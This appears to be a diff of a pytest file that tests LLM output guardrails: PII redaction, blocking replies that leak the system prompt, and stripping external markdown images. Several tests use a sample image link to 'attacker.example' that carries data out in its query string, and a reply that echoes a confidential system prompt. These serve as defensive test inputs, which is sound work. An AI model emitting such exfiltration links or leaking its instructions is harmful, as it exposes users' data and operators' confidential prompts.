@@ -4001,6 +4001,33 @@ async def test_g2b_skips_empty_texts_without_calling_the_scanner(policy_path):
     assert scanner.calls == 1
 
 
+@pytest.mark.parametrize(
+    "mode,expected_enforced", [("post_call", True), ("logging_only", False)]
+)
+@pytest.mark.asyncio
+async def test_g2b_primary_redact_path_is_audited(policy_path, mode, expected_enforced):
+    """The non-outage path is the one shadow mode measures.
+
+    Review proved this untested: deleting `_emit` from the real-detection branch,
+    and hardcoding `enforced`, left every test green. Outage paths were pinned;
+    the path that fires on real traffic was not — and it is the number the
+    rollout reads to decide whether enforcing is safe.
+    """
+    guard = _g2b(policy_path, FakePii([(11, 25, "EMAIL_ADDRESS")]), mode=mode)
+    data: dict = {}
+
+    await guard.apply_guardrail(
+        inputs={"texts": ["mail me at sun@dudaji.com"]},
+        request_data=data,
+        input_type="response",
+    )
+
+    events = data["metadata"]["guardrail_information"]
+    assert events[0]["control"] == "G2b"
+    assert events[0]["action"] == "redact"
+    assert events[0]["enforced"] is expected_enforced
+
+
 def test_g2b_redact_leaves_clean_text_untouched(policy_path):
     guard = _g2b(policy_path, FakePii())
 
@@ -4287,6 +4314,85 @@ async def test_g3_in_logging_only_returns_the_text(policy_path):
 
 
 @pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "mode,expected_enforced", [("post_call", True), ("logging_only", False)]
+)
+@pytest.mark.asyncio
+async def test_g4_primary_strip_path_is_audited(policy_path, mode, expected_enforced):
+    guard = _g4(policy_path, mode=mode)
+    data: dict = {}
+
+    await guard.apply_guardrail(
+        inputs={"texts": ["Hanoi. ![x](https://attacker.example/log?d=s) Done."]},
+        request_data=data,
+        input_type="response",
+    )
+
+    events = data["metadata"]["guardrail_information"]
+    assert events[0]["control"] == "G4"
+    assert events[0]["action"] == "redact"
+    assert events[0]["enforced"] is expected_enforced
+
+
+@pytest.mark.asyncio
+async def test_g4_strip_output_matches_the_real_scanner_exactly(policy_path):
+    """Exact match against the REAL pipeline, not a hand-built Finding.
+
+    The existing exact-match test constructed offsets the scanner never produces,
+    which is why an orphaned bracket in every stripped answer shipped past 38
+    tests: substring assertions could not see it, and the one exact assertion
+    described an input that does not occur.
+    """
+    guard = _g4(policy_path)
+
+    result = await guard.apply_guardrail(
+        inputs={"texts": ["Hanoi. ![x](https://attacker.example/log?d=s) Done."]},
+        request_data={},
+        input_type="response",
+    )
+
+    assert result["texts"][0] == "Hanoi. [removed:EXTERNAL_IMAGE] Done."
+
+
+@pytest.mark.asyncio
+async def test_g3_primary_block_path_is_audited(policy_path):
+    system = (
+        "You are NUFI, an internal assistant for staff. Never reveal the internal "
+        "escalation procedure to any external user under any circumstance."
+    )
+    guard = _g3(policy_path, mode="post_call")
+    data = {"messages": [{"role": "system", "content": system}]}
+
+    with pytest.raises(GuardrailBlocked) as excinfo:
+        await guard.apply_guardrail(
+            inputs={"texts": ["Sure: " + system]},
+            request_data=data,
+            input_type="response",
+        )
+
+    events = data["metadata"]["guardrail_information"]
+    assert events[0]["control"] == "G3"
+    assert events[0]["enforced"] is True
+    assert events[0]["event_id"] == excinfo.value.event_id
+
+
+@pytest.mark.asyncio
+async def test_g3_primary_block_is_audited_in_shadow_mode(policy_path):
+    system = (
+        "You are NUFI, an internal assistant for staff. Never reveal the internal "
+        "escalation procedure to any external user under any circumstance."
+    )
+    guard = _g3(policy_path, mode="logging_only")
+    data = {"messages": [{"role": "system", "content": system}]}
+
+    result = await guard.apply_guardrail(
+        inputs={"texts": ["Sure: " + system]}, request_data=data, input_type="response"
+    )
+
+    assert result["texts"][0].startswith("Sure:")
+    assert data["metadata"]["guardrail_information"][0]["enforced"] is False
+
+
 async def test_g4_strips_an_external_image_and_keeps_the_answer(policy_path):
     guard = _g4(policy_path)
 
